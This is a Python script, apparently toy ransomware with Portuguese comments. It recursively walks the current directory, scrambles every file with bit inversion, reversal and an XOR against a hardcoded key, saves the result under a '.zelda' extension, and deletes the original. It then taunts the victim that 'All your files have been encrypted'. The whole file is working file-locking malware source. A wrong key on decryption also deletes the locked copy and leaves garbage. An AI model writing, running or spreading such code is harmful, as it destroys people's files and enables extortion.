import base64
import os

# the whole encrypt and decrypt system
class BinaryConverter:
    # @staticmethod é usado quando não precisa de self em nenhuma função
    @staticmethod
    def string_to_binary(input_string):
        return ''.join(format(ord(char), '08b') for char in input_string)

    @staticmethod
    def binary_to_string(binary_string):
        char_array = [chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)]
        return ''.join(char_array)

    @staticmethod
    def invert_binary(binary_string):
        return ''.join('1' if bit == '0' else '0' for bit in binary_string)

    @staticmethod
    def reverse_binary(binary_string):
        return binary_string[::-1]

    @staticmethod
    def xor_with_fixed_vector(binary_string, fixed_vector):
        # Reutilizar o vetor fixo até cobrir o tamanho do binário
        fixed_vector = (fixed_vector * ((len(binary_string) // len(fixed_vector)) + 1))[:len(binary_string)]
        return ''.join(str(int(a) ^ int(b)) for a, b in zip(binary_string, fixed_vector))

    @staticmethod
    def binary_to_base64(binary_string):
        # Converte binário para array de bytes e depois para Base64
        byte_array = bytearray(int(binary_string[i:i+8], 2) for i in range(0, len(binary_string), 8))
        return base64.b64encode(byte_array).decode()

    @staticmethod
    def base64_to_binary(base64_string):
        # Converte Base64 de volta para binário
        byte_array = base64.b64decode(base64_string)
        return ''.join(format(byte, '08b') for byte in byte_array)

class FileEncryptor:
    def __init__(self, fixed_vector):
        self.fixed_vector = fixed_vector

    def encrypt_file(self, file_path):
        # Extrai a extensão original
        original_extension = os.path.splitext(file_path)[1]
        # Gera um novo caminho com a extensão .zelda
        new_file_path = os.path.splitext(file_path)[0] + ".zelda"

        with open(file_path, "rb") as file:
            file_data = file.read()
            binary_data = ''.join(format(byte, '08b') for byte in file_data)
            inverted_binary = BinaryConverter.invert_binary(binary_data)
            reversed_binary = BinaryConverter.reverse_binary(inverted_binary)
            xored_binary = BinaryConverter.xor_with_fixed_vector(reversed_binary, self.fixed_vector)
            encrypted_base64 = BinaryConverter.binary_to_base64(xored_binary)

        # Cria o diretório, se necessário
        os.makedirs(os.path.dirname(new_file_path), exist_ok=True)

        with open(new_file_path, "w") as file:
            # Salva a extensão original e os dados criptografados
            file.write(original_extension + "\n" + encrypted_base64)

        os.remove(file_path)  # Remove o arquivo original
        print(f"File encrypted and renamed to: {new_file_path}")

    def decrypt_file(self, file_path, fixed_vector2):
        with open(file_path, "r") as file:
            lines = file.readlines()
            original_extension = lines[0].strip()  # recuperando a extensão original
            encrypted_base64 = ''.join(lines[1:])  # resto é a Base64

        xored_binary = BinaryConverter.base64_to_binary(encrypted_base64)
        reversed_binary = BinaryConverter.xor_with_fixed_vector(xored_binary, fixed_vector2)
        inverted_binary = BinaryConverter.reverse_binary(reversed_binary)
        original_binary = BinaryConverter.invert_binary(inverted_binary)
        byte_array = bytearray(int(original_binary[i:i+8], 2) for i in range(0, len(original_binary), 8))

        new_file_path = file_path.replace(".zelda", original_extension)

        with open(new_file_path, "wb") as file:
            file.write(byte_array)

        os.remove(file_path)  # Remove o arquivo .zelda
        print(f"File decrypted and restored to: {new_file_path}")

    def process_directory(self, root_path, operation):
        script_name = os.path.basename(__file__)  # ignora o próprio script para não dar ruim
        for dirpath, _, filenames in os.walk(root_path):
            for file_name in filenames:
                if file_name == script_name:
                    continue  # ignora o próprio script
                file_path = os.path.join(dirpath, file_name)
                try:
                    if operation == 'encrypt' and not file_name.endswith(".zelda"):
                        self.encrypt_file(file_path)
                    elif operation == 'decrypt' and file_name.endswith(".zelda"):
                        self.decrypt_file(file_path, self.fixed_vector)  # Usa o fixed_vector já fornecido
                except Exception as e:
                    print(f"Error processing file {file_path}: {e}")
                    continue  # passa para o próximo arquivo


if __name__ == "__main__":
    fixed_vector = "1101010011011100101010100011101110101010110111011101010101010110"
    file_encryptor = FileEncryptor(fixed_vector)

    # Escolha de encriptar ou decriptar os arquivos
    choice = input("Do you want to (e)ncrypt or (d)ecrypt files in the directory and subdirectories? ")
    # root_path = input("Enter the root directory path: ")
    root_path = os.getcwd()

    if choice.lower() == 'e':
        print("All your files have been encrypted!!! HAHAHAHA")
        file_encryptor.process_directory(root_path, 'encrypt')
    elif choice.lower() == 'd':
        fixed_vector2 = input("Enter the fixed vector for decryption: ")  # Solicita o vetor fixo
        file_encryptor.fixed_vector = fixed_vector2  # Atualiza o fixed_vector para descriptografar
        file_encryptor.process_directory(root_path, 'decrypt')
    else:
        print("Invalid choice. Please select 'e' to encrypt or 'd' to decrypt.")
